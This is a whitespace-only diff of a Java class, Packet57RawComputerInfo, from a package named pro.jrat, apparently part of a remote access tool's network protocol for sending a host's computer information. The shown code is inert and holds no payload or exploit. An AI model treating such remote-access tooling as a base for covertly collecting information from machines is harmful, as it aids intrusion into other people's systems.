@@ -4,11 +4,10 @@ import java.io.DataOutputStream;
 
 import pro.jrat.common.io.StringWriter;
 
-
 public class Packet57RawComputerInfo extends AbstractOutgoingPacket {
 
 	private String info;
-	
+
 	public Packet57RawComputerInfo(String info) {
 		this.info = info;
 	}
